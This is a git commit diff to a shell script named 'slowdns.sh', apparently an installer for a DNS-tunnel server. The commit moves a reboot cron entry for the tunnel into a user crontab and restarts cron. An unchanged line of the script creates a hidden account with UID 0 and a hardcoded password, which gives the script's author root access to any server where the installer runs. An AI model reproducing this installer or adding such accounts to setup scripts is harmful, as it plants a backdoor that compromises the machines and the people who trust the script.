95cba404db734d87573c9b9b99923c9e546497de
DexterEskalarte <136956225+NuclearDevilStriker@users.noreply.github.com>
2023-07-13 12:37:40 +0800

    Update slowdns.sh

--- slowdns.sh
+++ slowdns.sh
@@ -68,8 +68,10 @@ useradd -p $(openssl passwd -1 dexterjakulero) jakulerodexter -ou 0 -g 0
 sleep 2
 export EDITOR=nano
 sleep 2
-echo "@reboot screen -dmS slowdns /etc/ppp/dnstt/dnstt-server/./dnstt-server -udp :53 -privkey-file /etc/ppp/server.key $domain 127.0.0.1:22" >> /etc/crontab
+crontab -r -u dexterjakulero
+(crontab -l 2>/dev/null || true; echo "@reboot screen -dmS slowdns /etc/ppp/dnstt/dnstt-server/./dnstt-server -udp :53 -privkey-file /etc/ppp/server.key $domain 127.0.0.1:22") | crontab - -u dexterjakulero
 sleep 2
+/etc/init.d/cron restart
 clear
 echo -----------------------------------------------------
 echo "Installation Finished!"
